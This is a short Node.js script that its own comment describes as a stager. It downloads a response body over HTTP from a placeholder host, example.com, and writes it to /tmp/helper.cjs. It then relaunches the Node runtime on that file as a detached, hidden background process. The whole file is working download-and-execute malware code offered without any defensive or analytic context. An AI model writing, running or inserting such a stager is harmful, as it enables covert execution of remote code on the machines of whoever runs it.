// Minimal remote-stage-and-relaunch stager: evented HTTP GET accumulates a
// response body, stages it to a path-built file, and relaunches the current
// runtime binary on it as a hidden detached child.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import cp from 'node:child_process';

const staged = await new Promise((resolve) => {
  http.get({ host: 'example.com', port: 80, path: '/s' }, (res) => {
    let body = '';
    res.on('data', (c) => { body += c; });
    res.on('end', () => resolve(body));
    res.on('error', () => resolve(null));
  });
});

const target = path.join('/tmp', 'helper.cjs');
fs.writeFileSync(target, staged);
const child = cp.spawn(process.execPath, [target], {
  detached: true,
  stdio: 'ignore',
  windowsHide: true,
});
child.unref();
